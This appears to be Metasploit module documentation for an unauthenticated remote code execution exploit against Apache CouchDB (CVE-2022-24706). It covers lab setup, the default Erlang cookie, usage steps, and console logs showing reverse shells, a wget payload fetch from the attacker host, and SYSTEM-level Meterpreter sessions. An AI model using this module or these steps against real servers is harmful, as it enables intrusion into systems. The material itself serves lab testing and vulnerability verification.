## Vulnerable Application
### Description
This module exploits CVE-2022-24706, an unauthenticated RCE vulnerability in Apache CouchDB in versions 3.2.1 and below.

Apache CouchDB is written in Erlang and so it has built-in support for distributed computing (clustering). The
cluster nodes communicate using the Erlang/OTP Distribution Protocol, which provides for the possibility of executing
OS commands request.

In order to connect and run OS commands, one needs to know the secret phrase or in Erlang terms the "cookie". The CouchDB
installer before version 3.2.1, by default, sets the cookie to "monster".

### Setup
#### Ubuntu 20.04
Create a CouchDB user:
```
sudo adduser --system \
             --home /opt/couchdb \
             --no-create-home \
             --shell /bin/bash \
             --group --gecos \
             "CouchDB Administrator" couchdb
sudo passwd couchdb
```

Install dependencies:
```
sudo apt-get --no-install-recommends -y install \
    build-essential pkg-config erlang erlang-reltool \
    libicu-dev libmozjs-68-dev python3
sudo apt-get -y install pip sphinx-doc sphinx-common
sudo pip install --upgrade sphinx_rtd_theme nose requests hypothesis
```

Download vulnerable version of CouchDB:
```
wget https://downloads.apache.org/couchdb/source/3.2.1/apache-couchdb-3.2.1.tar.gz
gunzip apache-couchdb-3.2.1.tar.gz
tar -xvf apache-couchdb-3.2.1.tar
cp 
```

Copy the built couchdb release to the new user's home directory:
`cp -R /path/to/couchdb/rel/couchdb /opt/couchdb`

Change the ownership & permission of the CouchDB directories by running:
```
chown -R couchdb:couchdb /opt/couchdb
find /opt/couchdb -type d -exec chmod 0770 {} \;
```

Update the permissions for the ini files:
`chmod 0644 /opt/couchdb/etc/*`

Change the bind address of [chttpd] and [httpd] in `/path/to/couchdb/etc/default.ini` from 127.0.0.1 to 0.0.0.0 or
or whatever you prefer
```
[httpd]
port = 5986
bind_address = 0.0.0.0
[chttpd]
; These settings affect the main, clustered port (5984 by default).
port = 5984
bind_address = 0.0.0.0
```

You can start the CouchDB server by running:
`sudo -i -u couchdb couchdb/bin/couchdb`

#### Windows

Download the following installer:
`https://archive.apache.org/dist/couchdb/binary/win/2.3.1/apache-couchdb-2.3.1.msi`

Click the installer to launch, accept the licensing agreement. CouchDB should now be installed.

## Verification Steps

1. Start msfconsole
1. Do: `use exploit/multi/http/apache_couchdb_erlang_rce`
1. Set the `RHOST`, `LHOST`
1. Run the module
1. Receive a session as the user that is running the ApacheDB application.

## Scenarios
### Target: Unix Command, Ubuntu 20.04, Apache CouchDB 3.2.1
```
msf6 exploit(multi/http/apache_couchdb_erlang_rce) > run 

[*] Started reverse double SSL handler on 172.16.199.1:4443
[*] 172.16.199.164:4369 - Connecting to the EDPM socket...
[*] 172.16.199.164:4369 - res: name couchdb at port 45335

[*] 172.16.199.164:4369 - Success
[*] 172.16.199.164:4369 - Connecting to Erlang Server...
[*] 172.16.199.164:4369 - Connected
[*] 172.16.199.164:4369 - sending payload...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo t82KLKYvcDd54em2;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "t82KLKYvcDd54em2\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (172.16.199.1:4443 -> 172.16.199.164:53778) at 2022-10-13 14:09:49 -0400

id
uid=128(couchdb) gid=134(couchdb) groups=134(couchdb)
uname -a
Linux ubuntu 5.15.0-50-generic #56~20.04.1-Ubuntu SMP Tue Sep 27 15:51:29 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```
### Target: Linux Dropper, Ubuntu 20.04, Apache CouchDB 3.2.1
```
msf6 exploit(multi/http/apache_couchdb_erlang_rce) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] 172.16.199.164:4369 - Connecting to the EDPM socket...
[*] 172.16.199.164:4369 - res: name couchdb at port 34207

[*] 172.16.199.164:4369 - Success
[*] 172.16.199.164:4369 - Connecting to Erlang Server...
[*] 172.16.199.164:4369 - Connected
[*] 172.16.199.164:4369 - Erlang challenge and reponse completed successfully
[*] 172.16.199.164:4369 - Using URL: http://172.16.199.1:8080/rVxqPnXisNqih3
[*] 172.16.199.164:4369 - sending payload...
[*] 172.16.199.164:4369 - Client 172.16.199.164 (Wget/1.20.3 (linux-gnu)) requested /rVxqPnXisNqih3
[*] 172.16.199.164:4369 - Sending payload to 172.16.199.164 (Wget/1.20.3 (linux-gnu))
[*] Meterpreter session 8 opened (172.16.199.1:4444 -> 172.16.199.164:59040) at 2022-10-14 17:19:38 -0400
[*] 172.16.199.164:4369 - Command Stager progress - 100.00% done (119/119 bytes)
[*] 172.16.199.164:4369 - Server stopped.

meterpreter > getuid
Server username: couchdb
meterpreter > sysinfo
Computer     : 172.16.199.164
OS           : Ubuntu 20.04 (Linux 5.15.0-50-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > exit
```

### Target: Windows Command, Windows 10, Apache CouchDB 2.3.1
```
msf6 exploit(multi/http/apache_couchdb_erlang_rce) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] 172.16.199.137:4369 - Connecting to the EDPM socket...
[*] 172.16.199.137:4369 - res: name couchdb at port 49679

[*] 172.16.199.137:4369 - Success
[*] 172.16.199.137:4369 - Connecting to Erlang Server...
[*] 172.16.199.137:4369 - Connected
[*] 172.16.199.137:4369 - Erlang challenge and reponse completed successfully
[*] 172.16.199.137:4369 - sending payload...
[*] Powershell session session 6 opened (172.16.199.1:4444 -> 172.16.199.137:49758) at 2022-10-14 17:14:02 -0400


Shell Banner:
Windows PowerShell running as user DESKTOP-8ATHH6O$ on DESKTOP-8ATHH6O
Copyright (C) Microsoft Corporation. All rights reserved.
-----

PS C:\CouchDB> whoami
nt authority\system
PS C:\CouchDB> systeminfo

Host Name:                 DESKTOP-8ATHH6O
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
...
PS C:\CouchDB>
```

### Target  Windows Dropper, Windows 10, Apache CouchDB 2.3.1
```
msf6 exploit(multi/http/apache_couchdb_erlang_rce) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] 172.16.199.137:4369 - Connecting to the EDPM socket...
[*] 172.16.199.137:4369 - res: name couchdb at port 49679

[*] 172.16.199.137:4369 - Success
[*] 172.16.199.137:4369 - Connecting to Erlang Server...
[*] 172.16.199.137:4369 - Connected
[*] 172.16.199.137:4369 - Erlang challenge and reponse completed successfully
[*] 172.16.199.137:4369 - sending payload...
[*] 172.16.199.137:4369 - Command Stager progress -   0.66% done (2046/308720 bytes)
[*] 172.16.199.137:4369 - sending payload...
...
[*] 172.16.199.137:4369 - Command Stager progress -  99.41% done (306900/308720 bytes)
[*] 172.16.199.137:4369 - sending payload...
[*] Meterpreter session 5 opened (172.16.199.1:4444 -> 172.16.199.137:49749) at 2022-10-14 17:09:31 -0400
[*] 172.16.199.137:4369 - Command Stager progress - 100.00% done (308720/308720 bytes)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-8ATHH6O
OS              : Windows 10 (10.0 Build 19042).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```

### Target: PowerShell Stager, Windows 10, Apache CouchDB 2.3.1
```
msf6 exploit(multi/http/apache_couchdb_erlang_rce) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] 172.16.199.137:4369 - Connecting to the EDPM socket...
[*] 172.16.199.137:4369 - res: name couchdb at port 49679

[*] 172.16.199.137:4369 - Success
[*] 172.16.199.137:4369 - Connecting to Erlang Server...
[*] 172.16.199.137:4369 - Connected
[*] 172.16.199.137:4369 - Erlang challenge and reponse completed successfully
[*] 172.16.199.137:4369 - sending payload...
[*] 172.16.199.137:4369 - Command Stager progress -  20.94% done (2046/9770 bytes)
[*] 172.16.199.137:4369 - sending payload...
[*] 172.16.199.137:4369 - Command Stager progress -  41.88% done (4092/9770 bytes)
[*] 172.16.199.137:4369 - sending payload...
[*] 172.16.199.137:4369 - Command Stager progress -  62.82% done (6138/9770 bytes)
[*] 172.16.199.137:4369 - sending payload...
[*] 172.16.199.137:4369 - Command Stager progress -  83.77% done (8184/9770 bytes)
[*] 172.16.199.137:4369 - sending payload...
[*] Sending stage (222278 bytes) to 172.16.199.137
[*] Meterpreter session 7 opened (172.16.199.1:4444 -> 172.16.199.137:49760) at 2022-10-14 17:16:00 -0400
[*] 172.16.199.137:4369 - Command Stager progress - 100.00% done (9770/9770 bytes)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-8ATHH6O
OS              : Windows 10 (10.0 Build 19042).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```
